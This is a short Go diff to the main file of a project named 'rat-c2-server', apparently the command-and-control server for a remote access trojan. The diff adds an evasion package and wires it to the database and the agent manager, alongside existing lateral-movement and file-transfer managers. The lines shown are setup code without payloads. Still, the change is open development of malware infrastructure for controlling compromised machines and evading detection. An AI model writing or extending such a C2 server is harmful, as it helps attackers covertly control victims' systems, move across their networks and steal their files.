@@ -4,20 +4,17 @@ import (
 	"context"
 	"crypto/tls"
 	"crypto/x509"
-	"encoding/json"
 	"fmt"
 	"log"
 	"net/http"
 	"os"
 	"os/signal"
-	"path/filepath"
 	"sync"
 	"syscall"
 	"time"
 
 	"github.com/gin-contrib/cors"
 	"github.com/gin-gonic/gin"
-	"github.com/gorilla/websocket"
 	"github.com/jmoiron/sqlx"
 	_ "github.com/mattn/go-sqlite3"
 	"github.com/spf13/viper"
@@ -26,6 +23,7 @@ import (
 	"rat-c2-server/internal/api"
 	"rat-c2-server/internal/config"
 	"rat-c2-server/internal/db"
+	"rat-c2-server/internal/evasion"
 	"rat-c2-server/internal/filetransfer"
 	"rat-c2-server/internal/lateral"
 	"rat-c2-server/internal/task"
@@ -69,6 +67,8 @@ func main() {
 	fileMgr := filetransfer.NewManager(database, cfg.FileStorage.Path)
 	lateralMgr := lateral.NewManager()
 	evasionMgr := evasion.NewManager()
+	evasionMgr.SetDB(database)
+	evasionMgr.SetAgentManager(agentMgr)
 
 	// WebSocket hub
 	wsHub := ws.NewHub(agentMgr, taskQueue, fileMgr)
